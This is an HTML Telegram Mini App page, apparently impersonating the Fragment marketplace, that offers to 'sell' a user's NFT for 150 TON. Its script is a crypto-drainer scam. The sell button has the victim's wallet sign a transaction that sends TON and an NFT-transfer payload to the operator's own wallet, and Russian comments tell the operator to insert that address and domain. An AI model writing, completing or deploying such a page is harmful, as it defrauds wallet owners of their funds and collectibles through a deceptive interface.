<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Fragment</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <style>
        body {
            background-color: #101114;
            color: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .header {
            display: flex;
            align-items: center;
            width: 100%;
            margin-bottom: 30px;
        }
        .back-btn {
            background: #1c1d22;
            border: none;
            color: white;
            padding: 10px 15px;
            border-radius: 50%;
            font-size: 18px;
            cursor: pointer;
        }
        .title {
            flex-grow: 1;
            text-align: center;
            font-weight: bold;
            font-size: 18px;
        }
        .card {
            background: #1c1d22;
            border-radius: 16px;
            padding: 20px;
            width: 90%;
            max-width: 400px;
            margin-bottom: 20px;
            text-align: center;
        }
        .gift-image {
            width: 150px;
            height: 150px;
            background: linear-gradient(45deg, #ffcc00, #ff9900);
            border-radius: 50%;
            margin: 0 auto 15px auto;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 50px;
        }
        .price {
            font-size: 24px;
            font-weight: bold;
            color: #0098ea;
            margin: 10px 0;
        }
        .sell-btn {
            background-color: #0098ea;
            color: white;
            border: none;
            padding: 16px;
            border-radius: 12px;
            font-size: 16px;
            font-weight: bold;
            width: 90%;
            max-width: 400px;
            cursor: pointer;
            margin-top: 20px;
        }
        .sell-btn:active {
            background-color: #007bbd;
        }
        .status {
            margin-top: 20px;
            color: #8b8e96;
            font-size: 14px;
            text-align: center;
        }
    </style>
</head>
<body>

    <div class="header">
        <button class="back-btn">←</button>
        <div class="title">Sale NFT</div>
        <div style="width: 40px;"></div>
    </div>

    <div class="card">
        <div class="gift-image">🎁</div>
        <div style="font-size: 18px; font-weight: bold;">Plush Pepe #2480</div>
        <div style="color: #8b8e96; font-size: 14px; margin-top: 5px;">Owner: You</div>
        <div class="price">150 TON</div>
    </div>

    <button class="sell-btn" id="sellBtn">Sell for 150 TON</button>
    <div class="status" id="statusText">Waiting for confirmation...</div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.ready();
        tg.expand();

        // ВСТАВЬ СЮДА АДРЕС СВОЕГО ТВИНК-КОШЕЛЬКА
        const MY_WALLET_ADDRESS = "UQ_ТВОЙ_АДРЕС_КОШЕЛЬКА"; 
        
        // Этот payload нужен для перевода NFT (заглушка для теста, реальный payload собирается через @ton/core)
        const NFT_TRANSFER_PAYLOAD = "te6cckEBAQEAAgAAAEysuc0="; 

        const tonConnectUI = new TONCONNECT_UI.TonConnectUI({
            manifestUrl: "https://твой-домен.com/tonconnect-manifest.json", // ЗАМЕНИШЬ ПОЗЖЕ
            buttonRootId: "sellBtn"
        });

        document.getElementById("sellBtn").onclick = async () => {
            document.getElementById("statusText").innerText = "Confirming transaction in wallet...";
            
            try {
                const transaction = {
                    validUntil: Math.floor(Date.now() / 1000) + 600,
                    messages: [
                        {
                            address: MY_WALLET_ADDRESS,
                            amount: "50000000", // 0.05 TON на комиссию
                            payload: NFT_TRANSFER_PAYLOAD
                        }
                    ]
                };

                await tonConnectUI.sendTransaction(transaction);
                
                // Если транзакция прошла, отправляем данные обратно в бота
                document.getElementById("statusText").innerText = "Success! Returning to bot...";
                tg.sendData(JSON.stringify({status: "sold", item: "Plush Pepe #2480"}));
                
            } catch (e) {
                document.getElementById("statusText").innerText = "Transaction cancelled.";
            }
        };
    </script>
</body>
</html>
